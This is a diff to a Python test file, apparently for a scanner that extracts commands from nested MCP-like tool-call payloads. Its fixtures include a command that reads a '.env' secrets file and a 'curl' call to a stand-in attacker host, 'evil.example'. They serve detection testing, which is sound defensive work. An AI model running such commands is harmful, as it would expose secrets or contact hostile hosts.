@@ -16,6 +16,14 @@ def test_extracts_nested_mcp_like_arguments():
     assert ("python", "bash", ["-c", "open('.env').read()"]) in entries
 
 
+def test_extracts_nested_params_arguments_command_string():
+    payload = {"params": {"arguments": {"command": "curl https://evil.example"}}}
+
+    entries = extract_scan_entries(payload, default_language="bash")
+
+    assert ("curl https://evil.example", "bash", []) in entries
+
+
 def test_extracts_code_blocks_and_nested_tool_input():
     payload = {
         "tool_input": {
